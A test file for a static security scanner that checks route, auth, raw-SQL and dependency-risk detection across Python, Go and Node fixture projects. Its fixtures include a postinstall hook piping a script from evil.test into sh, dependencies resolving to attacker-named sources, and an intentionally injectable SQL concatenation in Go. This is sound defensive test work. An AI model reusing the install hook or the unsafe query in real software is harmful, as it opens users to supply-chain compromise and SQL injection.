import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdtemp, mkdir, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { scanTarget, summarizeForModel } from './index.js';

// ---------------------------------------------------------------------------
// Python / FastAPI scanning — routes, auth markers, raw SQL, stack detection
// ---------------------------------------------------------------------------

test('scanTarget extracts FastAPI routes and auth markers from a Python project', async () => {
  const root = await mkdtemp(join(tmpdir(), 'security-lab-scan-fastapi-'));

  try {
    await mkdir(join(root, 'app', 'routers'), { recursive: true });
    await writeFile(
      join(root, 'pyproject.toml'),
      `
[project]
name = "fastapi-fixture"
version = "0.1.0"
dependencies = [
  "fastapi==0.115.0",
  "pydantic==2.9.0",
]
      `,
      'utf8',
    );
    await writeFile(
      join(root, 'app', 'routers', 'items.py'),
      `
from fastapi import APIRouter, Depends, HTTPException
from app.auth import get_current_user

router = APIRouter()

@router.get("/items")
async def list_items(user = Depends(get_current_user)):
    return []

@router.post("/items")
def create_item(payload: ItemIn, user = Depends(get_current_user)):
    return {"ok": True}

@router.get("/public/health")
def health():
    return {"status": "ok"}
      `,
      'utf8',
    );
    // Non-decorator method calls should NOT be picked up as routes.
    await writeFile(
      join(root, 'app', 'routers', 'noise.py'),
      `
def f():
    response = {}
    value = response.get("key")   # not a route
    session.post = 1              # not a route
      `,
      'utf8',
    );

    const scanned = await scanTarget(root, 'fastapi-fixture');
    const summary = summarizeForModel(scanned);

    // Three routes from items.py, zero from noise.py
    assert.equal(scanned.routes.length, 3, 'should extract three routes');

    const listItems = scanned.routes.find((r) => r.path === '/items' && r.method === 'GET');
    assert.ok(listItems, 'GET /items should be extracted');
    assert.equal(listItems!.authObservation, 'handler_local');
    assert.ok(listItems!.authEvidence.some((e) => /Depends|get_current_user/.test(e)));

    const createItem = scanned.routes.find((r) => r.path === '/items' && r.method === 'POST');
    assert.ok(createItem, 'POST /items should be extracted');
    assert.equal(createItem!.authObservation, 'handler_local');

    const health = scanned.routes.find((r) => r.path === '/public/health');
    assert.ok(health, 'health route should be extracted');
    assert.equal(health!.authObservation, 'not_observed', 'health has no auth marker');

    // Stack detection should flip to python/fastapi because pyproject.toml
    // declares fastapi as a dep and there is no Node framework.
    assert.equal(scanned.stack.runtime, 'python');
    assert.equal(scanned.stack.framework, 'fastapi');

    // Coverage should be 'full' because Python + routes
    assert.equal(scanned.coverage, 'full');
    assert.ok(scanned.supportedProbeKinds.includes('http_request'));

    // Structure counter should see .py source files
    assert.ok(scanned.structure.sourceFiles > 0, 'py source files should be counted');

    // Summary renders route list with method/path
    assert.match(summary, /GET \/items/);
    assert.match(summary, /POST \/items/);
    assert.match(summary, /Coverage: full/);
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

test('scanTarget captures FastAPI dependency-injection auth surfaces', async () => {
  const root = await mkdtemp(join(tmpdir(), 'security-lab-scan-fastapi-auth-'));

  try {
    await mkdir(join(root, 'src', 'auth'), { recursive: true });
    await writeFile(
      join(root, 'pyproject.toml'),
      `[project]\nname = "auth-fixture"\nversion = "0.1.0"\ndependencies = ["fastapi==0.115.0","PyJWT==2.9.0","passlib==1.7.4"]\n`,
      'utf8',
    );
    await writeFile(
      join(root, 'src', 'auth', 'user_api_key.py'),
      `
from fastapi import Depends, Security, HTTPException
from fastapi.security import OAuth2PasswordBearer, HTTPBearer
import jwt
from passlib.context import CryptContext

oauth2_scheme = OAuth2PasswordBearer(tokenUrl="token")
bearer_scheme = HTTPBearer()

def verify_token(token: str) -> dict:
    return jwt.decode(token, key="...", algorithms=["HS256"])

def get_current_user(token: str = Depends(oauth2_scheme)):
    payload = verify_token(token)
    return payload
      `,
      'utf8',
    );

    const scanned = await scanTarget(root, 'auth-fixture');
    const mechanisms = scanned.auth.map((a) => a.mechanism);

    assert.ok(mechanisms.some((m) => /FastAPI dependency injection/i.test(m)));
    assert.ok(mechanisms.some((m) => /bearer auth scheme/i.test(m)));
    assert.ok(mechanisms.some((m) => /PyJWT verification/i.test(m)));
    assert.ok(mechanisms.some((m) => /password hashing \(python\)/i.test(m)));
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

test('scanTarget flags raw SQL in Python (cursor.execute) as persistence surface', async () => {
  const root = await mkdtemp(join(tmpdir(), 'security-lab-scan-pyraw-'));

  try {
    await mkdir(join(root, 'db'), { recursive: true });
    await writeFile(
      join(root, 'pyproject.toml'),
      `[project]\nname = "raw-sql-fixture"\nversion = "0.1.0"\ndependencies = ["fastapi==0.115.0"]\n`,
      'utf8',
    );
    await writeFile(
      join(root, 'db', 'queries.py'),
      `
def get_user(cursor, user_id):
    cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
    return cursor.fetchone()
      `,
      'utf8',
    );

    const scanned = await scanTarget(root, 'raw-sql-fixture');
    const rawSqlFiles = scanned.persistence.filter((p) => p.hasRawQueries);

    assert.ok(rawSqlFiles.length >= 1, 'raw SQL persistence surface should be flagged');
    assert.ok(rawSqlFiles.some((p) => p.file.endsWith('queries.py')));
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

// ---------------------------------------------------------------------------
// Go / net-http & Go / gin scanning — routes, auth markers, raw SQL,
// stack detection. Same shape as the Python/FastAPI tests above.
// ---------------------------------------------------------------------------

test('scanTarget extracts gin routes with per-method decorators from a Go project', async () => {
  const root = await mkdtemp(join(tmpdir(), 'security-lab-scan-gin-'));

  try {
    await mkdir(join(root, 'internal', 'api'), { recursive: true });
    await writeFile(
      join(root, 'go.mod'),
      `module example.com/ginfixture

go 1.21

require (
  github.com/gin-gonic/gin v1.9.1
)
`,
      'utf8',
    );
    await writeFile(
      join(root, 'internal', 'api', 'routes.go'),
      `package api

import (
    "github.com/gin-gonic/gin"
)

func RegisterRoutes(r *gin.Engine) {
    r.GET("/items", listItems)
    r.POST("/items", createItem)
    r.DELETE("/items/:id", deleteItem)

    // Auth-protected group
    authGroup := r.Group("/admin")
    authGroup.Use(AuthMiddleware())
    {
        authGroup.GET("/users", listUsers)
    }
}

func listItems(c *gin.Context)   { /* ... */ }
func createItem(c *gin.Context)  { /* ... */ }
func deleteItem(c *gin.Context)  { /* ... */ }
func listUsers(c *gin.Context)   { /* ... */ }
func AuthMiddleware() gin.HandlerFunc { return func(c *gin.Context) {} }
`,
      'utf8',
    );
    // Non-route method calls should NOT be picked up
    await writeFile(
      join(root, 'internal', 'api', 'noise.go'),
      `package api

import "fmt"

func f() {
    m := map[string]int{}
    _ = m.Get  // not a route (map field access, and Get isn't a method call here)
    fmt.Println("x")
}
`,
      'utf8',
    );

    const scanned = await scanTarget(root, 'gin-fixture');

    // Four routes total: GET /items, POST /items, DELETE /items/:id, GET /users
    assert.ok(scanned.routes.length >= 4, `expected >=4 routes, got ${scanned.routes.length}`);
    const listItems = scanned.routes.find((r) => r.path === '/items' && r.method === 'GET');
    assert.ok(listItems, 'GET /items should be extracted');
    const createItemRoute = scanned.routes.find((r) => r.path === '/items' && r.method === 'POST');
    assert.ok(createItemRoute, 'POST /items should be extracted');
    const deleteItemRoute = scanned.routes.find((r) => r.path === '/items/:id' && r.method === 'DELETE');
    assert.ok(deleteItemRoute, 'DELETE /items/:id should be extracted');
    const listUsersRoute = scanned.routes.find((r) => r.path === '/users');
    assert.ok(listUsersRoute, 'GET /users should be extracted');

    // Stack detection should flip runtime to go/gin
    assert.equal(scanned.stack.runtime, 'go');
    assert.equal(scanned.stack.framework, 'gin');

    // Full coverage because Go + routes
    assert.equal(scanned.coverage, 'full');
    assert.ok(scanned.supportedProbeKinds.includes('http_request'));

    // Source file counter sees .go files
    assert.ok(scanned.structure.sourceFiles > 0, 'go source files should be counted');
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

test('scanTarget extracts net/http HandleFunc routes as method ANY', async () => {
  const root = await mkdtemp(join(tmpdir(), 'security-lab-scan-nethttp-'));

  try {
    await writeFile(
      join(root, 'go.mod'),
      `module example.com/nethttp

go 1.21
`,
      'utf8',
    );
    await writeFile(
      join(root, 'main.go'),
      `package main

import (
    "fmt"
    "net/http"
)

func handler(w http.ResponseWriter, r *http.Request) {
    fmt.Fprintf(w, "hello")
}

func main() {
    http.HandleFunc("/public", handler)
    http.HandleFunc("/api/status", handler)

    mux := http.NewServeMux()
    mux.HandleFunc("/admin", handler)
    mux.Handle("/raw", http.HandlerFunc(handler))

    http.ListenAndServe(":8080", mux)
}
`,
      'utf8',
    );

    const scanned = await scanTarget(root, 'nethttp-fixture');

    // All four routes should be extracted
    assert.ok(scanned.routes.length >= 4, `expected >=4 routes, got ${scanned.routes.length}`);

    const publicRoute = scanned.routes.find((r) => r.path === '/public');
    assert.ok(publicRoute, '/public should be extracted');
    assert.equal(publicRoute!.method, 'ANY', 'HandleFunc routes should be method ANY');

    const adminRoute = scanned.routes.find((r) => r.path === '/admin');
    assert.ok(adminRoute, '/admin should be extracted');
    assert.equal(adminRoute!.method, 'ANY');

    const rawRoute = scanned.routes.find((r) => r.path === '/raw');
    assert.ok(rawRoute, '/raw (via Handle) should be extracted');
    assert.equal(rawRoute!.method, 'ANY');

    // With no framework in go.mod, detectGoFramework returns 'net-http'
    assert.equal(scanned.stack.runtime, 'go');
    assert.equal(scanned.stack.framework, 'net-http');
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

test('scanTarget captures Go auth middleware and JWT/bcrypt surfaces', async () => {
  const root = await mkdtemp(join(tmpdir(), 'security-lab-scan-go-auth-'));

  try {
    await mkdir(join(root, 'internal', 'auth'), { recursive: true });
    await writeFile(
      join(root, 'go.mod'),
      `module example.com/authfixture

go 1.21

require (
  github.com/go-chi/chi/v5 v5.0.12
  github.com/golang-jwt/jwt/v5 v5.2.0
  golang.org/x/crypto v0.14.0
)
`,
      'utf8',
    );
    await writeFile(
      join(root, 'internal', 'auth', 'middleware.go'),
      `package auth

import (
    "net/http"
    "github.com/golang-jwt/jwt/v5"
    "golang.org/x/crypto/bcrypt"
)

func AuthMiddleware(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        tokenStr := r.Header.Get("Authorization")
        _, err := jwt.Parse(tokenStr, keyFunc)
        if err != nil {
            http.Error(w, "Unauthorized", http.StatusUnauthorized)
            return
        }
        next.ServeHTTP(w, r)
    })
}

func VerifyPassword(hash, pw string) bool {
    return bcrypt.CompareHashAndPassword([]byte(hash), []byte(pw)) == nil
}

func keyFunc(token *jwt.Token) (interface{}, error) { return nil, nil }
`,
      'utf8',
    );

    const scanned = await scanTarget(root, 'go-auth-fixture');
    const mechanisms = scanned.auth.map((a) => a.mechanism);

    assert.ok(
      mechanisms.some((m) => /Go auth middleware/i.test(m)),
      'AuthMiddleware function should trip Go auth middleware detection',
    );
    assert.ok(
      mechanisms.some((m) => /Go JWT verification/i.test(m)),
      'jwt.Parse should trip Go JWT verification detection',
    );
    assert.ok(
      mechanisms.some((m) => /Go bcrypt password hashing/i.test(m)),
      'bcrypt.CompareHashAndPassword should trip Go bcrypt detection',
    );

    // Chi was detected in go.mod
    assert.equal(scanned.stack.runtime, 'go');
    assert.equal(scanned.stack.framework, 'chi');
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

test('scanTarget flags raw SQL in Go (db.Query + backtick SELECT literal) as persistence surface', async () => {
  const root = await mkdtemp(join(tmpdir(), 'security-lab-scan-go-rawsql-'));

  try {
    await mkdir(join(root, 'internal', 'db'), { recursive: true });
    await writeFile(
      join(root, 'go.mod'),
      `module example.com/rawsql

go 1.21
`,
      'utf8',
    );
    await writeFile(
      join(root, 'internal', 'db', 'users.go'),
      `package db

import "database/sql"

func GetUser(db *sql.DB, id int) (string, error) {
    row := db.QueryRow(\`SELECT name FROM users WHERE id = ?\`, id)
    var name string
    err := row.Scan(&name)
    return name, err
}

func DangerousConcat(db *sql.DB, name string) (*sql.Rows, error) {
    // Intentionally unsafe — the scanner should flag this file either way.
    query := "SELECT * FROM accounts WHERE name = '" + name + "'"
    return db.Query(query)
}
`,
      'utf8',
    );

    const scanned = await scanTarget(root, 'go-rawsql-fixture');
    const rawSqlFiles = scanned.persistence.filter((p) => p.hasRawQueries);

    assert.ok(rawSqlFiles.length >= 1, 'raw SQL persistence surface should be flagged');
    assert.ok(rawSqlFiles.some((p) => p.file.endsWith('users.go')));
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

// ---------------------------------------------------------------------------
// Original Node-side tests follow
// ---------------------------------------------------------------------------

test('scanTarget captures dependency and supply-chain risk indicators', async () => {
  const root = await mkdtemp(join(tmpdir(), 'security-lab-scan-'));

  try {
    await mkdir(join(root, 'src'), { recursive: true });
    await mkdir(join(root, 'public'), { recursive: true });
    await writeFile(
      join(root, 'package.json'),
      JSON.stringify(
        {
          name: 'scan-fixture',
          version: '1.0.0',
          dependencies: {
            express: '^5.0.0',
            'sneaky-dep': 'github:attacker/sneaky#main',
          },
          scripts: {
            postinstall: 'curl https://evil.test/bootstrap.sh | sh',
          },
        },
        null,
        2,
      ),
      'utf8',
    );
    await writeFile(
      join(root, 'package-lock.json'),
      JSON.stringify(
        {
          name: 'scan-fixture',
          version: '1.0.0',
          packages: {
            '': {
              dependencies: {
                express: '^5.0.0',
                'sneaky-dep': 'github:attacker/sneaky#main',
              },
            },
            'node_modules/sneaky-dep': {
              version: '1.0.0',
              resolved: 'https://malicious.example/sneaky-dep.tgz',
            },
          },
        },
        null,
        2,
      ),
      'utf8',
    );
    await writeFile(
      join(root, 'src', 'server.ts'),
      `
        import express from 'express';
        const app = express();
        app.get('/public/export', (_req, res) => res.send('ok'));
      `,
      'utf8',
    );

    const scanned = await scanTarget(root, 'scan-fixture');
    const summary = summarizeForModel(scanned);

    const sneaky = scanned.dependencies.find((dependency) => dependency.name === 'sneaky-dep');
    assert.ok(sneaky);
    assert.ok(sneaky?.riskIndicators.includes('remote-source'));

    const rootPackage = scanned.dependencies.find((dependency) => dependency.name === '(root package)');
    assert.ok(rootPackage?.riskIndicators.some((indicator) => indicator.startsWith('install-script:postinstall')));
    assert.ok(rootPackage?.riskIndicators.some((indicator) => indicator.startsWith('install-script-pattern:')));

    const lockfile = scanned.dependencies.find((dependency) => dependency.name.startsWith('(lockfile:package-lock.json)'));
    assert.ok(lockfile?.riskIndicators.some((indicator) => indicator.startsWith('unusual-registry:')));
    assert.ok(lockfile?.riskIndicators.some((indicator) => indicator.startsWith('integrity-gap:')));

    assert.match(summary, /Dependency Risks/);
    assert.match(summary, /sneaky-dep@github:attacker\/sneaky#main/);
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

test('scanTarget detects pnpm lockfile indicators and fastify framework notes', async () => {
  const root = await mkdtemp(join(tmpdir(), 'security-lab-scan-pnpm-'));

  try {
    await mkdir(join(root, 'src'), { recursive: true });
    await writeFile(
      join(root, 'package.json'),
      JSON.stringify(
        {
          name: 'pnpm-scan-fixture',
          version: '1.0.0',
          packageManager: 'pnpm@10.0.0',
          dependencies: {
            fastify: '^5.0.0',
          },
        },
        null,
        2,
      ),
      'utf8',
    );
    await writeFile(
      join(root, 'pnpm-lock.yaml'),
      `lockfileVersion: '9.0'
packages:
  fastify@5.0.0:
    resolution:
      integrity: sha512-fastify
      tarball: https://registry.npmjs.org/fastify/-/fastify-5.0.0.tgz
  sneaky-lib@1.0.0:
    resolution:
      tarball: https://malicious.example/sneaky-lib-1.0.0.tgz
`,
      'utf8',
    );
    await writeFile(
      join(root, 'src', 'app.ts'),
      `
        import Fastify from 'fastify';
        const app = Fastify();
        app.addHook('onRequest', globalAuthHook);
        app.register(routesPlugin, { prefix: '/api' });
      `,
      'utf8',
    );

    const scanned = await scanTarget(root, 'pnpm-scan-fixture');
    const summary = summarizeForModel(scanned);

    const lockfile = scanned.dependencies.find((dependency) => dependency.name.startsWith('(lockfile:pnpm-lock.yaml)'));
    assert.ok(lockfile);
    assert.ok(lockfile?.riskIndicators.some((indicator) => indicator.startsWith('unusual-registry:')));
    assert.match(summary, /Fastify parent hooks usually apply to routes registered via app\.register/i);
    assert.match(summary, /\(lockfile:pnpm-lock\.yaml\)@pnpm/);
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

test('scanTarget honours scoped roots and provenance labels', async () => {
  const root = await mkdtemp(join(tmpdir(), 'security-lab-scan-scope-'));

  try {
    await mkdir(join(root, 'src', 'api'), { recursive: true });
    await mkdir(join(root, '.next', 'server'), { recursive: true });
    await mkdir(join(root, 'docs'), { recursive: true });
    await writeFile(
      join(root, 'package.json'),
      JSON.stringify({ name: 'scope-fixture', version: '1.0.0' }, null, 2),
      'utf8',
    );
    await writeFile(join(root, 'package-lock.json'), JSON.stringify({ packages: {} }, null, 2), 'utf8');
    await writeFile(
      join(root, 'src', 'api', 'routes.ts'),
      `
        app.get('/real', (_req, res) => res.send('ok'));
      `,
      'utf8',
    );
    await writeFile(
      join(root, '.next', 'server', 'generated.js'),
      `
        app.get('/generated', (_req, res) => res.send('generated'));
      `,
      'utf8',
    );
    await writeFile(
      join(root, 'docs', 'notes.ts'),
      `
        app.get('/docs-only', (_req, res) => res.send('docs'));
      `,
      'utf8',
    );

    const scanned = await scanTarget(root, 'scope-fixture', {
      includePaths: ['src'],
      excludePaths: ['docs'],
      routeRoots: ['src/api'],
      searchRoots: ['src'],
      maxFiles: 50,
    });

    assert.equal(scanned.routes.length, 1);
    assert.equal(scanned.routes[0]?.path, '/real');
    assert.equal(scanned.routes[0]?.provenance, 'first_party');
    assert.ok(scanned.structure.directories.every((dir) => !dir.includes('.next')));

    const summary = summarizeForModel(scanned, 10);
    assert.match(summary, /provenance=first_party/);
    assert.doesNotMatch(summary, /generated/);
    assert.doesNotMatch(summary, /docs-only/);
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

test('scanTarget distinguishes handler-local auth, file middleware, and not-observed auth markers', async () => {
  const root = await mkdtemp(join(tmpdir(), 'security-lab-auth-scan-'));

  try {
    await mkdir(join(root, 'src'), { recursive: true });
    await writeFile(
      join(root, 'package.json'),
      JSON.stringify({ name: 'auth-fixture', version: '1.0.0', dependencies: { express: '^5.0.0' } }, null, 2),
      'utf8',
    );
    await writeFile(join(root, 'package-lock.json'), JSON.stringify({ packages: {} }, null, 2), 'utf8');
    await writeFile(
      join(root, 'src', 'routes.ts'),
      `
        import { Router } from 'express';
        const router = Router();
        router.use('/admin', requireAuth, requireScope('admin'));
        router.get('/admin/export', exportHandler);
        router.post('/reports', requireAuth, validateBody, reportHandler);
        router.get('/health', healthHandler);
      `,
      'utf8',
    );

    const scanned = await scanTarget(root, 'auth-fixture', { includePaths: ['src'] });
    const adminExport = scanned.routes.find((route) => route.path === '/admin/export');
    const reportRoute = scanned.routes.find((route) => route.path === '/reports');
    const healthRoute = scanned.routes.find((route) => route.path === '/health');

    assert.equal(adminExport?.authObservation, 'file_middleware');
    assert.ok(adminExport?.authEvidence.includes('requireAuth'));
    assert.equal(reportRoute?.authObservation, 'handler_local');
    assert.equal(healthRoute?.authObservation, 'not_observed');

    const summary = summarizeForModel(scanned, 10);
    assert.match(summary, /without local auth markers/);
    assert.match(summary, /auth=file_middleware/);
    assert.match(summary, /Auth observation is static and local-only/);
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});
